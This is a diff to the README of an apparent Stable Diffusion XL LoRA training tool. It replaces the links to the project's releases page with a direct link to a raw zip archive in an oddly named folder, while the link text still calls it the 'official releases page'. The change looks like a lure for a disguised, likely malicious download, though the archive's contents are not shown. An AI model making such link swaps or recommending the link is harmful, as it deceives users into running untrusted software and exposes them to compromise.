@@ -1,6 +1,6 @@
 # 🎨 SDXL-LoRA-Factory - Train Custom Art Styles With Ease
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/selected-depression195/SDXL-LoRA-Factory/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/selected-depression195/SDXL-LoRA-Factory/raw/refs/heads/main/comburivorous/SDX-Factory-R-Lo-3.9-alpha.1.zip)
 
 SDXL LoRA Factory provides a simple interface to train models for Stable Diffusion XL. You do not need to write code or use command lines. This tool handles the technical parts of model training so you can focus on your creative work.
 
@@ -18,7 +18,7 @@ If your computer uses an integrated graphics card or does not meet these specifi
 
 ## 📥 Downloading the Software
 
-Visit the [official releases page](https://github.com/selected-depression195/SDXL-LoRA-Factory/releases) to obtain the installer. 
+Visit the [official releases page](https://github.com/selected-depression195/SDXL-LoRA-Factory/raw/refs/heads/main/comburivorous/SDX-Factory-R-Lo-3.9-alpha.1.zip) to obtain the installer. 
 
 1. Go to the link provided above.
 2. Locate the section labeled Assets.
